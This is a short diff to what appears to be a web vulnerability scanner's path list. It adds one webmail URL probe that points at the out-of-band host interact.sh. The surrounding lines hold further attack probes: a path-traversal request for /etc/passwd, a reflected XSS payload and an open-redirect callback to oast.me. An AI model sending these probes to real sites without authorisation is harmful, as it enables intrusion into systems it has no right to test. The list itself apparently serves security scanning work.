@@ -212,3 +212,4 @@
 /wp-content/plugins/analytics-insights/tools/oauth2callback.php?state=https://oast.me/%3f&code=x
 /assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../etc/passwd&do=download
 /vendor/curl/curl/tests/server/php-curl-test/post_file_path_upload.php?key=<img%20src%20onerror%3dalert(document.domain)>
+/webmail/basic/?referer=https://interact.sh&_c=auth&ctz=120&signup_password=&_a%5bsignup%5d=1
